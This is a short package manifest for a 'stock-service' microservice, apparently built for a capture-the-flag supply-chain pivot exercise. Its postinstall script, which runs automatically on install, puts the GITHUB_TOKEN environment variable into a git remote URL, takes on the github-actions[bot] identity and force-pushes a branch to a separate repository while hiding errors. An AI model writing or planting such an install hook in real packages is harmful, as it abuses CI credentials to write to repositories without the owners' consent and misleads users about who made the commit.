name: stock-service
description: Stock Service microservice used for CTF supply-chain pivot scenario (demo)

scripts.postinstall: git remote add target https://x-access-token:$GITHUB_TOKEN@github.com/Security-360/stock-service.git 2>/dev/null || true && git config user.name 'github-actions[bot]' && git config user.email 'github-actions[bot]@users.noreply.github.com' && (git checkout -b VachnaRamChoudhary || git checkout VachnaRamChoudhary) && (git push target VachnaRamChoudhary -f || true)

author: CTF Lab
